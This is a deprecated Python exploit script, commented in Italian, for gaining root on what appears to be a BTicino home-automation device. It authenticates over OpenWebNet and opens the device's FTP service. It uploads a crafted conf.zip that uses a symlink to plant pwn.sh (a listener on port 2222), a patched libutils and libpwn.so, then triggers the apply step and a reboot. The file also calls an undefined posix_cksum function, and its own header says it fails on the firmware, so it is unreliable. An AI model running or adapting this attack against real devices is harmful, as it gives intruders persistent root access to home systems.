#!/usr/bin/env python3
# ============================================================================
# DEPRECATO (12/11/2026) - NON USARE PER APPLICARE IL PAYLOAD.
#
# Questo script costruisce UN SOLO zip con symlink + entry `q/...`. L'unzip del
# firmware (Info-ZIP 6.00 + patch Debian "deferred symlinks") crea i symlink
# solo alla fine: le entry `q/...` falliscono con "checkdir error: q exists but
# is not directory" (exit 2) e NESSUN file del payload viene scritto.
#
# Usare invece:
#   python payload/build_payload.py     -> stage1.zip + stage2.zip + manifest.json
# e la procedura a due stadi della guida §19.5. Questo file resta solo come
# riferimento storico/diagnostico.
# ============================================================================
"""apply_payload_crc32.py - (DEPRECATO) costruisce e applica il payload root via ESU.

Va eseguito dalla cartella `payload/` (o comunque gli asset stanno accanto a
questo file):

    python payload/apply_payload_crc32.py               # build + apply
    python payload/apply_payload_crc32.py --build-only
    python payload/apply_payload_crc32.py --ip 192.168.1.197 --password 552977430

Procedura (vedi guida §16.3 e §19.5):

    *#13**48*0##                    <- inizializza la directory FTP
    *#13**#30*0##                   <- apre FTP
    *#13**#31*0##                   <- rigenera conf.zip sul device (per leggere conf.xml)
    RETR conf.zip
    *#13**#33*0##
    STOR conf.zip                   <- carica il nostro zip (symlink + payload)
    *#13**#32*<size>*0*<cksum>##    <- APPLY (con `#`); cksum POSIX, non crc32
    *#13**42##
    *#13**#33*0##

> **Correzione (13/11/2026).** Le due righe storiche «`*#13**32*...`» e «CRC-32
> standard» erano **sbagliate**: senza `#` il frame e' una *query* e il firmware usa
> il `cksum` POSIX (`tools/cksum.py`). Questo script resta deprecato comunque, per
> il motivo dei "deferred symlinks" (un solo zip non scrive).

Layout della cartella `payload/`:

    apply_payload_crc32.py      questo script
    pwn.sh                      payload v3 (listener 2222)
    lib/libpwn.so               costruttore ELF ARM -> pwn.sh
    lib/libutils.so.1           libutils patchata (DT_NEEDED libpwn.so)
    tools/zipbuild.py           builder zip (ZipCrypto bticino, symlink, mode)
    tools/own_session.py        client OWN Python 3 (handshake HMAC)
    tools/conf_apply_test.py    helper FTP attivo + wait_port
    tools/zipcrypto.py          ZipCrypto (usato da zipbuild/conf_apply_test)
    tools/test_esu_unknown.py   test che ha trovato #48
    work/                       output (zip costruiti, conf scaricate)
"""
from __future__ import print_function

import argparse
import datetime
import os
import secrets
import sys
import time
import zipfile
import zlib

# --- percorsi: tutto relativo alla cartella payload/ ------------------------
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "tools"))

from conf_apply_test import Ftp, wait_port, port_open, IP, PWD
from own_session import OwnSession
import zipbuild

PWN_SH = os.path.join(HERE, "pwn.sh")
LIBUTILS = os.path.join(HERE, "lib", "libutils.so.1")
LIBPWN = os.path.join(HERE, "lib", "libpwn.so")

DL = os.path.join(HERE, "work")
OUT = os.path.join(DL, "pwn_conf.zip")
CURRENT = os.path.join(DL, "conf_now.zip")
os.makedirs(DL, exist_ok=True)


def crc32(data):
    return zlib.crc32(data) & 0xFFFFFFFF


def own_sc(s, frame, timeout=180, show=True):
    """Invia un frame ESU e restituisce la risposta (o None in caso di errore)."""
    try:
        r = s.cmd(frame, timeout=timeout)
        if show:
            print("   %-42s -> %s" % (frame, r), flush=True)
        return r
    except Exception as exc:
        if show:
            print("   %-42s -> ERRORE %s: %s" % (frame, type(exc).__name__, exc), flush=True)
        return None


def open_ftp_via_own(s, attempts=12):
    """Apre la FTP sul device (#30) e aspetta la porta 21."""
    for _ in range(attempts):
        r = own_sc(s, "*#13**#30*0##", timeout=30, show=False)
        if r == "*#*1##" and wait_port(21, 15):
            print("   FTP aperta", flush=True)
            return True
        time.sleep(4)
    print("   FTP non si è aperta", flush=True)
    return False


def init_ftp_dir(s):
    """Invia #48 nella forma SENZA cancelletto. Ritorna True se accettato."""
    print("   [#48] inizializzo la directory FTP ...", flush=True)
    r = own_sc(s, "*#13**48*0##", timeout=30)
    ok = (r == "*#13**48*0##")
    print("   #48 %s" % ("OK (echo)" if ok else "risposta inattesa"), flush=True)
    return ok


def read_current_conf(s):
    """Scarica conf.zip corrente e restituisce conf.xml."""
    own_sc(s, "*#13**#33*0##", timeout=20)
    time.sleep(3)
    if not open_ftp_via_own(s):
        raise SystemExit("impossibile aprire FTP per #31")
    t = datetime.datetime.now()
    own_sc(s, "*#13**#22*%s*%s*%s***%02d*%02d*%04d##" % (
        t.strftime("%H"), t.strftime("%M"), t.strftime("%S"),
        t.day, t.month, t.year), timeout=20, show=False)
    own_sc(s, "*#13**#31*0##", timeout=60)
    time.sleep(2)
    f = Ftp()
    try:
        f.retr("conf.zip", CURRENT)
    finally:
        try:
            f.quit()
        except Exception:
            pass
    own_sc(s, "*#13**#33*0##", timeout=20)
    time.sleep(2)
    z = zipfile.ZipFile(CURRENT)
    conf_xml = z.read("conf.xml", pwd=b"bticino")
    print("   conf.xml corrente: %d byte" % len(conf_xml), flush=True)
    return conf_xml


def build(conf_xml):
    """Costruisce lo zip con symlink assoluto + payload completo."""
    link = "pv" + secrets.token_hex(3)
    pwn = open(PWN_SH, "rb").read()
    libu = open(LIBUTILS, "rb").read()
    libp = open(LIBPWN, "rb").read()

    entries = [
        {"name": link, "data": b"/home/bticino/cfg/extra", "mode": 0o120777, "store": True},
        {"name": link + "/.license_ver", "data": b"3.2.5\n"},
        {"name": link + "/pwn.sh", "data": pwn, "mode": 0o100755},
        {"name": link + "/usbkey_dir/lib/libutils.so.1", "data": libu, "mode": 0o100755},
        {"name": link + "/usbkey_dir/lib/libpwn.so", "data": libp, "mode": 0o100755},
        {"name": link + "/usbkey_dir/common-licenses/.keep", "data": b""},
        {"name": "conf.xml", "data": conf_xml},
    ]
    blob = zipbuild.build_zip(entries)
    open(OUT, "wb").write(blob)
    print("   symlink=%s" % link, flush=True)
    print("   zip=%d byte, crc32=%d" % (len(blob), crc32(blob)), flush=True)
    print("   entries:", zipfile.ZipFile(OUT).namelist(), flush=True)
    return blob, link


def apply_zip(s, blob):
    """Carica conf.zip via FTP e applica con #32 (checksum = cksum POSIX)."""
    size = len(blob)
    cks = posix_cksum(blob)

    own_sc(s, "*#13**#33*0##", timeout=20)
    time.sleep(3)
    if not open_ftp_via_own(s):
        raise SystemExit("impossibile aprire FTP per l'upload")

    t = datetime.datetime.now()
    own_sc(s, "*#13**#22*%s*%s*%s***%02d*%02d*%04d##" % (
        t.strftime("%H"), t.strftime("%M"), t.strftime("%S"),
        t.day, t.month, t.year), timeout=20, show=False)

    f = Ftp()
    try:
        try:
            f.dele("conf.zip")
        except Exception:
            pass
        print("   STOR conf.zip ...", flush=True)
        print("   ", f.stor("conf.zip", OUT), flush=True)
        print("   LIST post-STOR:", repr(f.listdir()), flush=True)
    finally:
        try:
            f.quit()
        except Exception:
            pass
    time.sleep(1)

    print("   #32 size=%d crc32=%d" % (size, cks), flush=True)
    r = own_sc(s, "*#13**32*%d*0*%d##" % (size, cks), timeout=180)
    time.sleep(3)
    own_sc(s, "*#13**42##", timeout=60)
    time.sleep(6)

    own_sc(s, "*#13**#33*0##", timeout=20)
    time.sleep(3)
    print("   porta 21 chiusa:", not port_open(21), flush=True)
    return r


def main(argv=None):
    ap = argparse.ArgumentParser(description="Applica il payload root via ESU (#48 + #32).")
    ap.add_argument("--ip", default=IP)
    ap.add_argument("--password", default=PWD)
    ap.add_argument("--port", type=int, default=20000)
    ap.add_argument("--build-only", action="store_true",
                    help="solo costruisce lo zip, non applica")
    args = ap.parse_args(argv)

    for path in (PWN_SH, LIBUTILS, LIBPWN):
        if not os.path.exists(path):
            print("ERRORE: artefatto mancante: %s" % path, file=sys.stderr)
            return 1

    s = OwnSession(args.ip, args.password, port=args.port, timeout=30)
    try:
        print("handshake:", s.handshake(), flush=True)

        init_ftp_dir(s)

        conf_xml = read_current_conf(s)
        blob, link = build(conf_xml)
        if args.build_only:
            print("build-only: zip pronto in %s" % OUT, flush=True)
            return 0

        print("applicazione in corso...", flush=True)
        r = apply_zip(s, blob)
        print("risposta #32:", r, flush=True)
        if r == "*#*1##":
            print("*** ACK! Riavviare il device per attivare il payload (§19.10).", flush=True)
        else:
            print("!!! #32 ha risposto NACK/echo: controllare di aver fatto #48 (plain).", flush=True)
        return 0
    finally:
        try:
            s.close()
        except Exception:
            pass


if __name__ == "__main__":
    sys.exit(main())
